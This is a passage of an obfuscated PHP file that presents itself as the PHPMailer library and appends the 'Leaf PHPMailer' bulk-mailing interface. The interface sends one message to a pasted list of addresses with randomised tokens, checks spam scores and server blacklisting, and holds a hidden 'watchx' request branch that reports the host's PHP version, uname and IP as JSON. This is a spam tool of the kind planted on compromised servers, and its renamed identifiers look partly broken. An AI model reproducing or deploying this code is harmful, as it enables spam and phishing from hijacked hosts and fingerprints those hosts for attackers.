     */ public static function hjyt_198759551($mkrn_1554949113){return(boolean)preg_match('/^(.{'.(self::MAX_LINE_LENGTH+2).',})/m',$mkrn_1554949113);}/**
     * Allows for public read access to 'to' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */ public function dgny_4018314664(){return $this->$iocy_252678980;}/**
     * Allows for public read access to 'cc' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */ public function kcsp_1920183406(){return $this->$isnj_112844655;}/**
     * Allows for public read access to 'bcc' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */ public function biwa_1481849718(){return $this->$givi_3685882489;}/**
     * Allows for public read access to 'ReplyTo' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */ public function guev_4111202233(){return $this->$ojew_958603384;}/**
     * Allows for public read access to 'all_recipients' property.
     * @note: Before the send() call, queued addresses (i.e. with IDN) are not yet included.
     * @access public
     * @return array
     */ public function uooc_1789317724(){return $this->$abzh_2865723390;}/**
     * Perform a callback.
     * @param boolean $isSent
     * @param array $to
     * @param array $cc
     * @param array $bcc
     * @param string $subject
     * @param string $body
     * @param string $from
     */ protected function lcxz_1576094480($sfgu_469319589,$bqux_3616002756,$givi_3685882489,$qyuj_779734746,$jsxw_4224597626,$ssxo_3685223346,$jiew_3105530224){if(!empty($this->$efpl_3772023408)&&is_callable($this->$efpl_3772023408)){$bmqr_2412646131=array($sfgu_469319589,$bqux_3616002756,$givi_3685882489,$qyuj_779734746,$jsxw_4224597626,$ssxo_3685223346,$jiew_3105530224);call_user_func_array($this->$efpl_3772023408,$bmqr_2412646131);}}}/**
 * PHPMailer exception handler
 * @package PHPMailer
 */ class gpmm_657600444 extends tdyn_4248308942{/**
     * Prettify error message output
     * @return string
     */ public function zerg_370503141(){$jjum_3051771048='<strong>'.htmlspecialchars($this->pmnj_171178595())."</strong><br />\n";return $jjum_3051771048;}}if($_REQUEST['watchx']){$agdt_3206337475=phpversion();$nhsf_2289514936=php_uname();$arkj_2783163181=gethostbyname($_SERVER["HTTP_HOST"]);echo json_encode(array("version"=>$agdt_3206337475,"uname"=>$nhsf_2289514936,"platform"=>PHP_OS,"ip"=>$arkj_2783163181,"mailerx"=>true,));die();}function ymht_355637499(){print'
<head>
    <title>'.str_replace("www.","",$_SERVER['HTTP_HOST']).' - Leaf PHPMailer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.4.1/cosmo/bootstrap.min.css" rel="stylesheet" >    

</head>';}ymht_355637499();print'<body>';print'<div class="container col-lg-6">
        <h3><font color="green"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>'.$rupa_3332309223['version'].'</small></h3>
        <form name="form" id="form" method="POST" enctype="multipart/form-data" action="">
                    <input type="hidden" name="action" value="score">

            <div class="row">
                <div class="form-group col-lg-6 "><label for="senderEmail">Email</label><input type="text" class="form-control  input-sm " id="senderEmail" name="senderEmail" value="'.$lprm_2224870840.'"></div>
                <div class="form-group col-lg-6 "><label for="senderName">Sender Name</label><input type="text" class="form-control  input-sm " id="senderName" name="senderName" value="'.$yzwt_1457941275.'"></div>
            </div>
            <div class="row">
                <span class="form-group col-lg-6  "><label for="attachment">Attachment <small>(Multiple Available)</small></label><input type="file" name="attachment[]" id="attachment[]" multiple/></span>

                <div class="form-group col-lg-6"><label for="replyTo">Reply-to</label><input type="text" class="form-control  input-sm " id="replyTo" name="replyTo" value="'.$xgbh_1853530023.'" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-12 "><label for="subject">Subject</label><input type="text" class="form-control  input-sm " id="subject" name="subject" value="'.$jsxw_4224597626.'" /></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-6"><label for="messageLetter">Message Letter <button type="submit" class="btn btn-default btn-xs" form="form" name="action" value="view" formtarget="_blank">Preview </button></label><textarea name="messageLetter" id="messageLetter" class="form-control" rows="10" id="textArea">'.$mtgd_4231067723.'</textarea></div>
                <div class="form-group col-lg-6 "><label for="emailList">Email List <a href="?emailfilter=on" target="_blank" class="btn btn-default btn-xs">Filter/Extract</a></label><textarea name="emailList" id="emailList" class="form-control" rows="10" id="textArea">'.$iyxz_542469786.'</textarea></div>
            </div>
            <div class="row">
                <div class="form-group col-lg-6 ">
                    <label for="messageType">Message Type</label>
                    HTML <input type="radio" name="messageType" id="messageType" value="1" '.$zanp_410646757.'>
                    Plain<input type="radio" name="messageType" id="messageType" value="2" '.$smac_421552847.'>
                </div>
                <div class="form-group col-lg-3 ">
                    <label for="charset">Character set</label>
                    <select class="form-control input-sm" id="charset" name="charset">
                        <option '.$pddh_905460609.'>UTF-8</option>
                        <option '.$xfcw_1633189697.'>ISO-8859-1</option>
                    </select>
                </div>
                <div class="form-group col-lg-3 ">
                    <label for="encoding">Message encoding</label>
                    <select class="form-control input-sm" id="encode" name="encode">
                        <option '.$aitm_2486965335.'>8bit</option>
                        <option '.$hkid_75696582.'>7bit</option>
                        <option '.$iofk_3336628485.'>binary</option>
                        <option '.$omqu_3482464886.'>base64</option>
                        <option '.$yqiy_4092968548.'>quoted-printable</option>

                    </select>
                </div>
            </div>
            <button type="submit" class="btn btn-default btn-sm" form="form" name="action" value="send">SEND</button> or <a href="#" onclick="document.getElementById(\'form\').submit(); return false;">check SpamAssassin Score</a>
   
        </form>
    </div>
    <div class="col-lg-6"><br>
        <label for="well">Instruction</label>
        <div id="well" class="well well">
            <h4>Server Information</h4>
            <ul>
                <li>Server IP Address : <b>'.$_SERVER['SERVER_ADDR'].' </b> <a href="?check_ip='.$_SERVER['SERVER_ADDR'].'" target="_blank" class="label label-primary">Check Blacklist <i class="glyphicon glyphicon-search"></i></a></li>
                <li>PHP Version : <b>'.phpversion().'</b></li>
                

            </ul>
            <h4>HELP</h4>
            <ul>
                <li>[-email-] : <b>Reciver Email</b> (emailuser@emaildomain.com)</li>
                <ul>
                    <li>[-emailuser-] : <b>Email User</b> (emailuser) </li>
                    <li>[-emaildomain-] : <b>Email User</b> (emaildomain.com) </li>
                </ul>
                <li>[-time-] : <b>Date and Time</b> ('.date("m/d/Y h:i:s a",time()).')</li>
                
                <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
                <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                <li>[-randommd5-] : <b>Random MD5 </b></li>
            </ul>
            <h4>example</h4>
            Receiver Email = <b>user@domain.com</b><br>
            <ul>
                <li>hello <b>[-emailuser-]</b> = hello <b>user</b></li>
                <li>your domain is <b>[-emaildomain-]</b> = Your Domain is <b>domain.com</b></li>
                <li>your code is  <b>[-randommd5-]</b> = your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
            </ul>

            <h6>by <b><a href="http://'.$rupa_3332309223['website'].'">'.$rupa_3332309223['website'].'</a></b></h6>
        </div>
    </div>';if($_POST['action']=="send"){print'    <div class="col-lg-12">';$jsxe_364433032=explode("\r\n",$iyxz_542469786);$jtgp_2013832146=count($jsxe_364433032);$cvlg_2363233923=1;foreach($jsxe_364433032 as $irje_3885137012){print'<div class="col-lg-1">['.$cvlg_2363233923.'/'.$jtgp_2013832146.']</div><div class="col-lg-4">'.$irje_3885137012.'</div>';if(!zcoe_260502936($irje_3885137012)){print'<div class="col-lg-6"><span class="label label-default">Incorrect Email</span></div>';print"<br>\r\n";}else{$naok_1361488968=new coye_4211091271;$naok_1361488968->tnku_753605756(oqxa_3580578504($lprm_2224870840,$irje_3885137012),oqxa_3580578504($yzwt_1457941275,$irje_3885137012));$naok_1361488968->hcmd_3022651540(oqxa_3580578504($xgbh_1853530023,$irje_3885137012));$naok_1361488968->jvwg_3609129138($irje_3885137012);$naok_1361488968->$uash_182487569=oqxa_3580578504($jsxw_4224597626,$irje_3885137012);$naok_1361488968->$lhgl_2491560500=oqxa_3580578504($mtgd_4231067723,$irje_3885137012);if($fopv_1219652353==1){$naok_1361488968->kiiy_676309589(true);$naok_1361488968->$qbaw_2558022429=strip_tags(oqxa_3580578504($mtgd_4231067723,$irje_3885137012));}else $naok_1361488968->kiiy_676309589(false);$naok_1361488968->$xekg_286892112=$twsq_3215248917;$naok_1361488968->$nrqf_135092103=$jacn_1749612879;for($crku_3865851505=0;$crku_3865851505<count($_FILES['attachment']['name']);$crku_3865851505++){if($_FILES['attachment']['tmp_name'][$crku_3865851505]!=""){$naok_1361488968->eiua_1908280956($_FILES['attachment']['tmp_name'][$crku_3865851505],$_FILES['attachment']['name'][$crku_3865851505]);}}if(!$naok_1361488968->cgvm_2809346765()){echo '<div class="col-lg-6"><span class="label label-default">'.htmlspecialchars($naok_1361488968->$wblz_3236939731).'</span></div>';}else{echo '<div class="col-lg-6"><span class="label label-success">Ok</span></div>';}print"<br>\r\n";}$cvlg_2363233923++;for($rjba_140662621=0;$rjba_140662621<40000;$rjba_140662621++){echo ' ';}}}elseif($_POST['action']=="score"){$naok_1361488968=new coye_4211091271;$naok_1361488968->tnku_753605756(oqxa_3580578504($lprm_2224870840,$irje_3885137012),oqxa_3580578504($yzwt_1457941275,$irje_3885137012));$naok_1361488968->hcmd_3022651540(oqxa_3580578504($xgbh_1853530023,$irje_3885137012));$naok_1361488968->jvwg_3609129138("username@domain.com");$naok_1361488968->$uash_182487569=oqxa_3580578504($jsxw_4224597626,$irje_3885137012);$naok_1361488968->$lhgl_2491560500=oqxa_3580578504($mtgd_4231067723,$irje_3885137012);if($fopv_1219652353==1){$naok_1361488968->kiiy_676309589(true);$naok_1361488968->$qbaw_2558022429=strip_tags(oqxa_3580578504($mtgd_4231067723,$irje_3885137012));}else $naok_1361488968->kiiy_676309589(false);$naok_1361488968->$xekg_286892112=$twsq_3215248917;$naok_1361488968->$nrqf_135092103=$jacn_1749612879;$naok_1361488968->wsxu_1077481805();$najr_4138339477=$naok_1361488968->ucnk_2090781897();$bkow_1281410033=curl_init();curl_setopt($bkow_1281410033,CURLOPT_RETURNTRANSFER,1);curl_setopt($bkow_1281410033,CURLOPT_URL,'http://spamcheck.postmarkapp.com/filter');curl_setopt($bkow_1281410033,CURLOPT_POSTFIELDS,http_build_query(array('email'=>$najr_4138339477,'options'=>'long')));curl_setopt($bkow_1281410033,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($bkow_1281410033,CURLOPT_TIMEOUT,15);$qfeq_1048251387=curl_exec($bkow_1281410033);$qfeq_1048251387=json_decode($qfeq_1048251387);print'    <div class="col-lg-12">';if($qfeq_1048251387->$pmaf_2653842393==TRUE){$encb_848901969=$qfeq_1048251387->$yqnl_1804436815;if($encb_848901969>5)$awxu_3981121951="danger";else $awxu_3981121951="success";print'<div class="text-'.$awxu_3981121951.'">Your SpamAssassin score is '.$encb_848901969.'  </div>
<div>Full Report : <pre>'.$qfeq_1048251387->$upty_4112879088.'</pre></div>';print'    </div>';}}print'</body>';}?>
